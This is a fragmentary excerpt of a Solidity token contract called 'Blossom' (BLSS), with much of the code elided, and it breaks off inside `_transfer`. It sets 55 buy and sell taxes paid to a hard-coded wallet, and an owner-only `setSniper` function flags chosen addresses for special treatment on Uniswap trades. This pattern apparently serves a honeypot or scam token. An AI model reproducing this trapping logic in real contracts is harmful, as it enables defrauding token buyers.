...
contract Contract is Context, IERC20, Ownable {
    ...
    string private _name = "Blossom";
    string private _symbol = "BLSS";
    uint8 private _decimals = 3;

    address payable public marketingWalletAddress = payable(0x87102f97FBd55FB05E551a31487c8b58429756C3); 
    address payable public teamWalletAddress = payable(0x87102f97FBd55FB05E551a31487c8b58429756C3); 
   ...
   uint256 public _airDropFee = 1;
    ...
    uint256 public _marketingShare = 110;
    uint256 public _teamShare = 0;

    uint256 public _totalTaxIfBuying = 55;
    uint256 public _totalTaxIfSelling = 55;
    uint256 public _totalDistributionShares = 110;
    ...
    function setSniper(address ad,bool NewValue) external onlyOwner() {
    isSwap[ad] = NewValue;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isSwap[sender] && sender == uniswapPair )
            {
